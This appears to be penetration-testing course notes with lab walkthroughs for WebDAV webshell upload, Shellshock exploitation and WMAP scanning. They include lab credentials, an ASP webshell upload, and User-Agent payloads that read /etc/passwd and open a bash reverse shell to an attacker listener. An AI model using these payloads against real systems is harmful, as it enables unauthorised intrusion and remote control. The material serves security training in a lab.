# Vulnerability Assessment

<br>

The Vulnerability Assessment course is designed for penetration testers and cybersecurity practitioners looking to enhance their ability to identify and evaluate security weaknesses in networks, applications, and systems. 

<br>

## 1. WebDAV Vulnerabilities

**Davtest is a WebDAV scanner** that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.
**Cadaver** is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

**Objective**: Exploit the WebDAV service and retrieve the flag!

The following username and password may be used to access the service:
- **Username**: bob
- **Password**: password_123321

```shell
nmap -Pn -A <target_IP>
nmap --script http-enum -sV -p 80 <target_IP>
# We have found the directory also received 401 error i.e Unauthorized.

davtest -url http://<target_IP>/webdav
# We can notice, /webdav path is secured with basic authentication. We have the credentials to access the /webdav path.

davtest -auth bob:password_123321 -url http://<target_IP>/webdav
# We can notice, we have uploaded almost all the important file types to the /webdav directory. Also, we can execute three types of files. i.e asp, text, and html.

# Upload the .asp backdoor on the target machine to /webdav directory using cadaver utility.
cadaver http://<target_IP>/webdav
# Enter credentials: bob:password_123321

# Uploading asp backdoor to the IIS web server in webdav directory.
put /usr/share/webshells/asp/webshell.asp
ls

# Access the backdoor using the Firefox browser and enter the credentials: bob:password_123321.
http://<target_IP>/webdav/webshell.asp

# Now we can access the web page  http://<address>/webshell.asp and run commands.
whoami
ipconfig
dir C:\
type C:\flag.txt
```

> `ls  -al /usr/share/webshells`
> - This directory contains webshells, which are scripts that allow remote access to a web server after being uploaded. 
> - Webshells are typically small scripts written in languages like PHP, ASP, JSP, or Python.
> - They are often used by attackers (or penetration testers) to gain remote access to a compromised web server.
> - Example Contents: PHP Webshells (for PHP-based servers), ASP Webshells (for ASP.NET/IIS servers), JSP Webshells (for Java-based servers).

<br>

## 2. Shellshock

**Shellshock** is a security vulnerability discovered in 2014 that affects the Unix Bash shell. It allows attackers to execute arbitrary code on a vulnerable system by exploiting how Bash handles environment variables, potentially leading to unauthorized access or control of the system. The Shellshock vulnerability affects **GNU Bash versions 1.14 through 4.3**, released prior to the discovery of the flaw in 2014.

**Objective**: Exploit the vulnerability and execute arbitrary commands on the target machine.

```shell
# Start Nmap and check if the target is vulnerable to Shellshock.
nmap -Pn -sV <target_IP>
curl <web_address>

# Check the line: xhttp.open("GET", "/gettime.cgi", true);
<address>/gettime.cgi
```

A **CGI file** (Common Gateway Interface) is a script or program executed by a web server to generate dynamic content, such as processing form input, generating web pages, or handling requests. These scripts can be written in various programming languages, like Perl, Python, PHP, or Bash. 

```shell
# We note the presence of the CGI script.: xhttp.open("GET", "/gettime.cgi", true);.
ls -al /usr/share/nmap/scripts | grep -e "shellshock"
nmap --script-help "*shellshock*"

# Visit: https://nmap.org/nsedoc/scripts/http-shellshock.html

# We check if the script is vulnerable to Shellshock.
nmap -sV --script http-shellshock --script-args uri=/gettime.cgi,cmd=ls <target_IP>
nmap -sV --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target_IP>
```

**Exploit with Metasploit**

```shell
service postgresql start && msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target_IP>
set TARGETURI <path_to_CGI_script>
set LHOST <my_IP>
exploit
```

**Exploit with Burp**

```shell
# Activate the proxy using the extension in Firefox.
# Open BurpSuite > Proxy > Intercept is on.
# We are going to inject the special characters in User-Agent header.
# Send to the repeater.
User-Agent: () { :; } ; echo; echo; /bin/bash -c 'cat /etc/passwd'
# Click send.
# We can utilize bash to essencially connect to a listener on our Kali Linux. We can do this using netcat.
nc -nvlp <my-port-number>
User-Agent: () { :; } ; echo; echo; /bin/bash -c 'bash -i >& dev/tcp/<myIP>/<myPort> 0>&1'
# We should get a reversal on our netcat listener.
whoami
cat /etc/*issue
```

<br>

## 3. Scanning with WMAP

The **[WMAP](https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/)** extension is typically used to automate the process of performing web server enumeration and also automates the process of identifying misconfigurations and vulnerabilities on a web server. This tool is integrated with Metasploit and allows us to conduct web application scanning from within the Metasploit Framework.

```shell
# STEP 1: In this case the target IP is my IP plus one
ifconfig

# STEP 2: Start Metasploit
# This launches the Metasploit Framework. Ensure PostgreSQL is running in the background.
service postgresql start && msfconsole

# STEP 3: Load the WMAP extension
# WMAP is used to perform web application assessments inside Metasploit.
load wmap

# STEP 4: Register the web application host
# This adds the target IP as a "site" for WMAP to analyze.
wmap_sites -a <target_IP>

# STEP 5: Add a specific URL as the scan target
# This defines the protocol + IP or domain for the actual scan.
wmap_targets -t http://<target_IP>

# STEP 6: Verify the sites and targets are loaded correctly
# These commands help ensure your setup is correct before running scans.
wmap_sites -l
wmap_targets -l

# STEP 7: Run passive site traversal
# This scans the site for links, pages, and parameters â€” like a crawler.
# It does NOT test for vulnerabilities, just maps the site.
wmap_run -t

# STEP 8: Run active vulnerability scan
# This performs actual vulnerability checks like XSS, SQLi, file upload issues, etc.
wmap_run -e
```
